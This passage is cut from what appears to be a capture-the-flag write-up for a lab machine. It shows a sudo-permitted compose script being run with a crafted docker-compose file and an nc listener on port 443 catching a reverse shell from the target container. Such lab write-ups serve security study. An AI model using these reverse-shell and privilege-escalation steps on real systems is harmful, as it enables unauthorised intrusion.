@@ -1,0 +1,1 @@
+e directory into /john . I’ll start nc in a different terminal and run the script: john@cybermonday:~$ sudo /opt/secure_compose.py /tmp/docker-compose.yml Starting services... At nc there’s a shell in the container: oxdf@hacky$ nc -lvnp 443 Listening on 0.0.0.0 443 Connection received on 10.10.11.228 44116 bash: cannot set terminal process group
